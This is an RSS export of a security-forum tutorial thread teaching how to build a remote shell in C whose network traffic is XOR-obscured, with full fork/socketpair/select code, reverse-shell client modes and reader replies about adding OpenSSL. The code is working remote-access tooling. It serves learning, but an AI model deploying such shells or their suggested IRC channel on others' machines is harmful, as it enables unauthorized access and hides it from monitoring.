@@ -1,0 +1,691 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Remote Shells. Part II. Crypt your link</title>
+    <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306</link>
+    <description>In [Part I](https://0x00sec.org/t/remote-shells-part-i/269/1) of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream... :o
+
+__LEVEL: Beginner__
+
+## How are we going to do that?
+In order to crypt our communication, we need something in front of the shell that gets the data from/to the network and crypts/decrypts it. This can be done in many different ways.
+
+This time we have choose to launch the shell as a separated child process and use a __socketpair__ to transfer the data received/sent through the network to the shell process.  The father process will then crypt and decrypt the data going into/coming from the network/shell. This may look a bit confusing at first glance, but that is just because of my writing :).
+
+A __socketpair__ is just a pair of sockets that are immediately connected. Something like running the client and server code in just one system call. Conceptually they behave as a __pipe__ but the main difference is that the sockets are bidirectional in opposition to a pipe where one of the file descriptors is read only and the other one is write only.
+
+__socketpairs__ are a convenient IPC (InterProcess Communication) mechanism and fits pretty well in our network oriented use case... because they are sockets after all.
+
+
+## Spawning a shell
+Let&#39;s start from our previous example and add a couple of functions. The first one will set up the socket pair and create a new process (using __fork__). Let&#39;s take a first look to the whole function before continuing.
+
+```
+void
+secure_shell (int s)
+{
+  pid_t  pid;
+  int    sp[2];
+
+  /* Create a socketpair to talk to the child process */
+  if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) &lt; 0)
+    {
+      perror (&quot;socketpair:&quot;);
+      exit (1);
+    }
+
+  /* Fork a child process */
+  if ((pid = fork ()) &lt; 0)
+    {
+      perror (&quot;fork:&quot;);
+      exit (1);
+    }
+  else
+    if (!pid) /* If we are the child Process */
+      {
+	close (sp[1]);
+	close (s);
+
+	/* Start the shell as in part I*/
+	start_shell (sp[0]);
+	/* This function will never return */
+      }
+
+  /* At this point we are the father process */
+  close (sp[0]);
+
+  printf (&quot;+ Starting async read loop\n&quot;);
+  async_read (s, sp[1]);
+
+}
+
+```
+
+First, we create a socket pair using the syscall __socketpair__). The last parameter is an array where we will get our pair of sockets. Obviously we can only use local sockets (```AF_UNIX``` or ```AF_LOCAL``` they are the same) at least on GNU/Linux. As mentioned before, those sockets will be connected meaning that, what you send through one of them is received in the other, and the other way around. This is very convenient as we do not have to write all those ```bind```, ```listen```, ```accept``` and ```connect```.... We get all that with just one system call.
+
+Once we have our socket pair we will create a new process using the __fork__ syscall. The ```fork``` system call creates a new process as  an identical image of the calling process, same code, same data, same open files, same sockets... The only difference between the child process and the father process is that the ```pid``` variable will be 0 for the child and will be the child pid for the father.
+
+So we check the ```pid``` variable and if we are the child (```!pid```) we close the file descriptors that we do not need anymore and we just start a shell using the ```start_shell``` function from Part I, but passing as parameter one of the connected sockets returned by ```socketpair```.
+
+Everything from this point on is the same that with our first remote code in Part I, but instead of feeding data into our shell directly from the network, we will be sending/receiving data using the counterpart socket provided by ```socketpair```.
+
+## Asynchronous Read
+The last part of the ```secure_shell``` function is executed by the father process. It calls a function that we have named ```async_read```. This function will do the following:
+
+* Whenever something is received from the network, it will decode the data and send it to the shell using the counterpart socket we have got from the ```socketpair``` system call. 
+* At the same time, whenever the shell produces some output, the function will read that data, crypt it and send it through the network. 
+
+It make sense, isn&#39;t it?. Now we just need to figure out how to implement this. Well, for instance, let&#39; use the ```select``` system call (we could use ```poll``` but I will reserve it for a later post).
+
+So, this is the code for the ```async_read``` function
+
+```
+void
+async_read (int s, int s1)
+{
+  fd_set         rfds;
+  struct timeval tv;
+  int            max = s &gt; s1 ? s : s1;
+  int            len, r;
+  char           buffer[1024];
+
+  max++;
+  while (1)
+    {
+      FD_ZERO(&amp;rfds);
+      FD_SET(s,&amp;rfds);
+      FD_SET(s1,&amp;rfds);
+
+      /* Time out. */
+      tv.tv_sec = 1;
+      tv.tv_usec = 0;
+
+      if ((r = select (max, &amp;rfds, NULL, NULL, &amp;tv)) &lt; 0)
+	{
+	  perror (&quot;select:&quot;);
+	  exit (EXIT_FAILURE);
+	}
+      else if (r &gt; 0) /* If there is data to process */
+	{
+	  if (FD_ISSET(s, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s, buffer, 1024)) &lt;= 0) 	exit (1);
+	      memfrob (buffer, len);
+
+	      write (s1, buffer, len);
+	    }
+	  if (FD_ISSET(s1, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s1, buffer, 1024)) &lt;= 0) exit (1);
+
+	      memfrob (buffer, len);
+	      write (s, buffer, len);
+	    }
+	}
+    }
+}
+```
+
+This is a standard `select` loop for a network application. It is nothing really special about it, but, in case you haven&#39;t seen one before (there is a first time for everything), here it come a brief explanation.
+
+`select` let us monitor many file descriptor at once. We provide the syscall with a list of file descriptors to monitor and, whenever there is data to read, it is possible to write or an exception happen on any of them, `select` will let us know. Let&#39;s see how to use it.
+
+`select` requires at least 2 non-NULL parameters, and you should usually use three:
+
+* An integer indicating the highest-numbered file descriptor to monitor plus 1. Check the declaration of variable max to see what does that mean (note: file descriptors are just integers).
+* A File descriptor set that will contain the list of file descriptors to monitor for reading (this is the fd_set variable)
+* A timeout. When the timeout is NULL, select will block until something happens in any of the file descriptors passed as parameters. If a timeout is specified, the function will return if nothing have happened during the period of time indicated by the timeout.
+
+The two `NULL` parameters are additional file descriptors sets for writing and for exceptions, but we are not going to talk about those now.
+
+The system call returns the number of file descriptors that have data to be read (because we are only using the read file descriptor set) or 0 if the call has timed out.
+
+For the reader convenience we repeat the code to set up the select call here.
+```
+      FD_ZERO(&amp;rfds);
+      FD_SET(s,&amp;rfds);
+      FD_SET(s1,&amp;rfds);
+
+      /* Time out. */
+      tv.tv_sec = 1;
+      tv.tv_usec = 0;
+
+      if ((r = select (max, &amp;rfds, NULL, NULL, &amp;tv)) &lt; 0)
+	{
+	  perror (&quot;select:&quot;);
+	  exit (EXIT_FAILURE);
+	}
+```
+
+Before each call to ```select``` we always have to initialize the file descriptor set. This is done with two macros. ```FD_ZERO``` initializes the set. ```FD_SET``` allow us to add file descriptors to the set. In our case we have to add our network connected socket (```s```) and also our paired socket (```s1```). 
+
+The timeout is specified with a ```struct timeval``` type that gives us microseconds resolution. In our case we have set the timeout to 1 second.
+
+At this point we can call select and wait for the data to come.
+
+## Processing the data
+`select` tell us that we have got something in some of the file descriptors in our set, but we have to find out which one actually received the data. Again, let&#39;s repeat the relevant code here for convenience.
+
+```
+	  if (FD_ISSET(s, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s, buffer, 1024)) &lt;= 0) 	exit (1);
+	      memfrob (buffer, len);
+
+	      write (s1, buffer, len);
+	    }
+	  if (FD_ISSET(s1, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s1, buffer, 1024)) &lt;= 0) exit (1);
+
+	      memfrob (buffer, len);
+	      write (s, buffer, len);
+	    }
+```
+
+In the general case you will have a loop to check every file descriptor in your set. In this case we only have 2 so a couple of if will do the trick. Think about it as a loop [unrolling optimization](https://en.wikipedia.org/wiki/Loop_unrolling) :). Yes, all right, we can make the if block into a function... But... I have to leave something for you to try ;) (actually there is a reason for this but it is out of scope at this point)
+
+So, if we get data in our network socket, we just read the data, decrypt it and resend it to our shell. If we get data from our shell, we read it, we crypt it and we send it back to the network client.
+
+That&#39;s it. The ```memfrob``` function does a XOR crypting with key ([42](https://en.wikipedia.org/wiki/The_Hitchhiker&#39;s_Guide_to_the_Galaxy_%28novel%29)). The greatest thing about XOR crypting is that the same function can be used for crypt and decrypt. Other than that, with a 1 byte long key (42 in this case) it is pretty useless.
+
+## A Secure Client
+OK, now we have a way to receive and send crypt data from/to our shell. We need a counterpart to our program that can deal with this crypt data. No problem, we just need to make a small change to our main function, and we will be done.
+
+The new ```main``` function looks like this:
+
+```
+int
+main (int argc, char *argv[])
+{
+  /* FIXME: Check command-line arguments */
+  if (argv[1][0] == &#39;c&#39;)
+    secure_shell (client_init (argv[2], atoi(argv[3])));
+  else if (argv[1][0] == &#39;s&#39;)
+    secure_shell (server_init (atoi(argv[2])));
+  else if (argv[1][0] == &#39;a&#39;)
+    async_read (client_init (argv[2], atoi(argv[3])), 0);
+  else if (argv[1][0] == &#39;b&#39;)
+    async_read (server_init (atoi(argv[2])), 0);
+		  
+  return 0;
+}
+```
+
+We exploit the fact that everything on UNIX is a file descriptor. Using file descriptor 0 (that is the standard input or ```stdin```), and our ```async_read``` function we get automatically a working secure client.
+
+Using that trick, two additional flags had been added to launch the application as a client for direct and reverse remote shell access.
+
+## Testing again
+Now, you already know how to compile your program so, let&#39;s go straight to test our secure remote shell.
+
+Open two terminals to run the shell and the client and also fire up your preferred sniffer. You may want to use wireshark and take advantage of its nice &quot;Follow TCP Stream&quot; feature. Now, start capturing traffic in the loopback interface.
+
+In one terminal type:
+
+```
+$ ./rss s 5000
+```
+
+In the other terminal type
+
+```
+$ ./rss a 127.0.0.1 5000
+```
+
+Everything will look like our original remote shell. Just type a couple of commands and then go back to wireshark and take a look to what was sent through the network... Sure, that is how a XOR crypted shell session looks like!
+
+## NEXT
+For the time being, the NEXT step I leave it to you, appreciated reader. There is a bunch of things you can try with very little modification of this small program.
+
+* Try to add a password to only allow authorized user access your remote shell
+* Try to use a proper crypto algorithm...openssl somebody?
+* Try to use a different communication protocol... what about using an IRC channel to access your remote shell
+* Try to access special commands in the server and not just forward everything to the shell (this is a generalization of the first point)
+
+Let&#39;s see what you come out with...
+
+As usual you can find all the source code at:
+
+https://github.com/0x00pf/0x00sec_code
+
+Happy Hacking!</description>
+    
+    <lastBuildDate>Sun, 15 May 2016 23:05:13 +0000</lastBuildDate>
+    <category>Networking</category>
+    <atom:link href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/16">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/16</link>
+        <pubDate>Sun, 21 Jan 2018 00:37:55 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-16</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p>Nope you were right after all, dup2 doesn’t seem to be possible <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"><br>
+I’m continuing this journey <img src="https://0x00sec.org/images/emoji/twitter/relieved.png?v=9" title=":relieved:" class="emoji" alt=":relieved:"></p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/15">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/15</link>
+        <pubDate>Sun, 15 May 2016 00:43:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-15</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p>Yes I already got to that part and got the client side encrypted. However setting up the server side is a whole different story it seems. I found good documentation on the server side lacking and am currently researching. This is the reason I decided to learn OpenSSL from the ground up. I’ll try throwing something together first a la ‘I don’t know why, but it works’.</p>
+<p><a href="http://www.ibm.com/developerworks/library/l-openssl/" rel="nofollow noopener">http://www.ibm.com/developerworks/library/l-openssl/</a> - tutorial, set up a client<br>
+<a href="https://www.openssl.org/docs/manmaster/" rel="nofollow noopener">https://www.openssl.org/docs/manmaster/</a> - man pages for OpenSSL<br>
+Are some interesting sites for anyone that’s interested in OpenSSL programming.</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/14">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/14</link>
+        <pubDate>Fri, 13 May 2016 22:15:01 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-14</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>As far as I understood how it works, you indeed have a socket at the very end to send/receive the data through the network, but it looks like OpenSSL works on top of the the socket. According to the examples I checked, you need to call <code>BIO/SSL_write</code> and <code>BIO/SSL_read</code> to crypt and decrypt.</p>
+<p>I think that if you just dup the underlying file descriptor you will be sending the crypt data (received from the network) to the shell. If that is correct, the code should be similar to the one in this post, but instead of calling <code>write</code> and <code>read</code> on the network socket (within <code>async_read</code>) you will have to call <code>SSL_write</code> and <code>SSL_read</code>.</p>
+<p><code>SSL_get_fd</code> and <code>SSL_set_fd</code> will be needed to setup the <code>select</code> fd sets and manage the <code>accept</code> call and so on.</p>
+<p>I think it works like that, but I haven’t tried myself. Anyhow, looks like you are getting there. I’m looking forward to see your implementation!</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/13</link>
+        <pubDate>Fri, 13 May 2016 22:07:21 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-13</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p>dup2 does work, you can use BIO/SSL_get_fd and BIO/SSL_set_fd</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/12">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/12</link>
+        <pubDate>Fri, 13 May 2016 19:04:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-12</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah I meant that it’s kinda complex.</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/11</link>
+        <pubDate>Fri, 13 May 2016 13:12:00 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-11</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>True… OpenSSL is not easy and the documentation is not the best either.</p>
+<p>Regarding the forking I have to check but I think you have to use the openSSL functions to read/write crypt data. I do not think that just a <strong>dup2</strong> will work.</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/10</link>
+        <pubDate>Fri, 13 May 2016 05:18:24 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-10</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p>OpenSSL is more complex then I thought.<br>
+I was trying to do a copy-pasta, no clue how it works version, but it was no good.<br>
+Currently learning the OpenSSL protocol.<br>
+If I use OpenSSL, I don’t need the fork and childprocess right?</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/9</link>
+        <pubDate>Thu, 12 May 2016 23:19:17 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-9</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>No your english is great! It’s the pure complexity that I think the reason why Oaktree will have to re-read this a few times! I think I will have to re-read this a few times myself!</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/8</link>
+        <pubDate>Thu, 12 May 2016 21:51:16 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-8</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah… I know… my English is not the best</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/7</link>
+        <pubDate>Thu, 12 May 2016 15:51:58 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-7</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            <p>I’m going to have to read this a few times…</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/6</link>
+        <pubDate>Thu, 12 May 2016 15:50:09 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-6</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks everybody for the positive feedback!</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/5</link>
+        <pubDate>Thu, 12 May 2016 15:49:53 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-5</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
+        <description><![CDATA[
+            <p>Grade A! Love it <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<p>I’ll take the challenge for the proper encryption ^^<br>
+Was thinking of PGP. I’ll see if I can make that work, It’s about time to learn some encryption.</p>
+<p>Also thanks for sharing the meaning of life <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"><br>
+I couldnt find the 42 anywhere in the source though.</p>
+<p>EDIT: Oops, I should check man pages before asking stupid questions ^^</p>
+<p>EDIT2: Ended up learning Cryptography, gonna take a while for the PGP encrypted version.</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/4</link>
+        <pubDate>Thu, 12 May 2016 12:59:34 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-4</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Quality article Pico! I’ve been meaning to leave a comment the last couple of days, and I’ve finally got around to it.</p>
+<p>I’m so glad we have found you, you really are a valuable asset. These articles are very high quality <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/3</link>
+        <pubDate>Thu, 12 May 2016 12:39:23 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-3</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            <p>Quality as always pico, keep it up <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/2</link>
+        <pubDate>Wed, 11 May 2016 19:29:46 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-2</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+      <item>
+        <title>Remote Shells. Part II. Crypt your link</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>In <a href="https://0x00sec.org/t/remote-shells-part-i/269/1">Part I</a> of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream… :o</p>
+<p><strong>LEVEL: Beginner</strong></p>
+<h2>How are we going to do that?</h2>
+<p>In order to crypt our communication, we need something in front of the shell that gets the data from/to the network and crypts/decrypts it. This can be done in many different ways.</p>
+<p>This time we have choose to launch the shell as a separated child process and use a <strong>socketpair</strong> to transfer the data received/sent through the network to the shell process.  The father process will then crypt and decrypt the data going into/coming from the network/shell. This may look a bit confusing at first glance, but that is just because of my writing :).</p>
+<p>A <strong>socketpair</strong> is just a pair of sockets that are immediately connected. Something like running the client and server code in just one system call. Conceptually they behave as a <strong>pipe</strong> but the main difference is that the sockets are bidirectional in opposition to a pipe where one of the file descriptors is read only and the other one is write only.</p>
+<p><strong>socketpairs</strong> are a convenient IPC (InterProcess Communication) mechanism and fits pretty well in our network oriented use case… because they are sockets after all.</p>
+<h2>Spawning a shell</h2>
+<p>Let’s start from our previous example and add a couple of functions. The first one will set up the socket pair and create a new process (using <strong>fork</strong>). Let’s take a first look to the whole function before continuing.</p>
+<pre><code class="lang-auto">void
+secure_shell (int s)
+{
+  pid_t  pid;
+  int    sp[2];
+
+  /* Create a socketpair to talk to the child process */
+  if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) &lt; 0)
+    {
+      perror ("socketpair:");
+      exit (1);
+    }
+
+  /* Fork a child process */
+  if ((pid = fork ()) &lt; 0)
+    {
+      perror ("fork:");
+      exit (1);
+    }
+  else
+    if (!pid) /* If we are the child Process */
+      {
+	close (sp[1]);
+	close (s);
+
+	/* Start the shell as in part I*/
+	start_shell (sp[0]);
+	/* This function will never return */
+      }
+
+  /* At this point we are the father process */
+  close (sp[0]);
+
+  printf ("+ Starting async read loop\n");
+  async_read (s, sp[1]);
+
+}
+
+</code></pre>
+<p>First, we create a socket pair using the syscall <strong>socketpair</strong>). The last parameter is an array where we will get our pair of sockets. Obviously we can only use local sockets (<code>AF_UNIX</code> or <code>AF_LOCAL</code> they are the same) at least on GNU/Linux. As mentioned before, those sockets will be connected meaning that, what you send through one of them is received in the other, and the other way around. This is very convenient as we do not have to write all those <code>bind</code>, <code>listen</code>, <code>accept</code> and <code>connect</code>… We get all that with just one system call.</p>
+<p>Once we have our socket pair we will create a new process using the <strong>fork</strong> syscall. The <code>fork</code> system call creates a new process as  an identical image of the calling process, same code, same data, same open files, same sockets… The only difference between the child process and the father process is that the <code>pid</code> variable will be 0 for the child and will be the child pid for the father.</p>
+<p>So we check the <code>pid</code> variable and if we are the child (<code>!pid</code>) we close the file descriptors that we do not need anymore and we just start a shell using the <code>start_shell</code> function from Part I, but passing as parameter one of the connected sockets returned by <code>socketpair</code>.</p>
+<p>Everything from this point on is the same that with our first remote code in Part I, but instead of feeding data into our shell directly from the network, we will be sending/receiving data using the counterpart socket provided by <code>socketpair</code>.</p>
+<h2>Asynchronous Read</h2>
+<p>The last part of the <code>secure_shell</code> function is executed by the father process. It calls a function that we have named <code>async_read</code>. This function will do the following:</p>
+<ul>
+<li>Whenever something is received from the network, it will decode the data and send it to the shell using the counterpart socket we have got from the <code>socketpair</code> system call.</li>
+<li>At the same time, whenever the shell produces some output, the function will read that data, crypt it and send it through the network.</li>
+</ul>
+<p>It make sense, isn’t it?. Now we just need to figure out how to implement this. Well, for instance, let’ use the <code>select</code> system call (we could use <code>poll</code> but I will reserve it for a later post).</p>
+<p>So, this is the code for the <code>async_read</code> function</p>
+<pre><code class="lang-auto">void
+async_read (int s, int s1)
+{
+  fd_set         rfds;
+  struct timeval tv;
+  int            max = s &gt; s1 ? s : s1;
+  int            len, r;
+  char           buffer[1024];
+
+  max++;
+  while (1)
+    {
+      FD_ZERO(&amp;rfds);
+      FD_SET(s,&amp;rfds);
+      FD_SET(s1,&amp;rfds);
+
+      /* Time out. */
+      tv.tv_sec = 1;
+      tv.tv_usec = 0;
+
+      if ((r = select (max, &amp;rfds, NULL, NULL, &amp;tv)) &lt; 0)
+	{
+	  perror ("select:");
+	  exit (EXIT_FAILURE);
+	}
+      else if (r &gt; 0) /* If there is data to process */
+	{
+	  if (FD_ISSET(s, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s, buffer, 1024)) &lt;= 0) 	exit (1);
+	      memfrob (buffer, len);
+
+	      write (s1, buffer, len);
+	    }
+	  if (FD_ISSET(s1, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s1, buffer, 1024)) &lt;= 0) exit (1);
+
+	      memfrob (buffer, len);
+	      write (s, buffer, len);
+	    }
+	}
+    }
+}
+</code></pre>
+<p>This is a standard <code>select</code> loop for a network application. It is nothing really special about it, but, in case you haven’t seen one before (there is a first time for everything), here it come a brief explanation.</p>
+<p><code>select</code> let us monitor many file descriptor at once. We provide the syscall with a list of file descriptors to monitor and, whenever there is data to read, it is possible to write or an exception happen on any of them, <code>select</code> will let us know. Let’s see how to use it.</p>
+<p><code>select</code> requires at least 2 non-NULL parameters, and you should usually use three:</p>
+<ul>
+<li>An integer indicating the highest-numbered file descriptor to monitor plus 1. Check the declaration of variable max to see what does that mean (note: file descriptors are just integers).</li>
+<li>A File descriptor set that will contain the list of file descriptors to monitor for reading (this is the fd_set variable)</li>
+<li>A timeout. When the timeout is NULL, select will block until something happens in any of the file descriptors passed as parameters. If a timeout is specified, the function will return if nothing have happened during the period of time indicated by the timeout.</li>
+</ul>
+<p>The two <code>NULL</code> parameters are additional file descriptors sets for writing and for exceptions, but we are not going to talk about those now.</p>
+<p>The system call returns the number of file descriptors that have data to be read (because we are only using the read file descriptor set) or 0 if the call has timed out.</p>
+<p>For the reader convenience we repeat the code to set up the select call here.</p>
+<pre><code class="lang-auto">      FD_ZERO(&amp;rfds);
+      FD_SET(s,&amp;rfds);
+      FD_SET(s1,&amp;rfds);
+
+      /* Time out. */
+      tv.tv_sec = 1;
+      tv.tv_usec = 0;
+
+      if ((r = select (max, &amp;rfds, NULL, NULL, &amp;tv)) &lt; 0)
+	{
+	  perror ("select:");
+	  exit (EXIT_FAILURE);
+	}
+</code></pre>
+<p>Before each call to <code>select</code> we always have to initialize the file descriptor set. This is done with two macros. <code>FD_ZERO</code> initializes the set. <code>FD_SET</code> allow us to add file descriptors to the set. In our case we have to add our network connected socket (<code>s</code>) and also our paired socket (<code>s1</code>).</p>
